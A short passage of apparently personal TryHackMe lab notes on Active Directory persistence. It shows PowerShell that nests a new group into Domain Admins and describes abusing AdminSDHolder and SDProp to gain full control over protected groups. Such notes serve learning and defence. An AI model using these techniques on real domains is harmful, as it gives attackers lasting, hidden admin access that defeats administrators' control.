5. Nested Groups
	``` powershell
	# create group
	New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
	# make it inhuret from domin admins
	Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup1"
	# add your persistance user

	```
6. throw ACL over AdminSDHolder 
	> A process called SDProp takes the ACL of the AdminSDHolder container and applies it to all protected groups every 60 minutes. We can thus write an ACE that will grant us full permissions on all protected groups.
	`Invoke-ADSDPropagation` can be used to speed up that  process
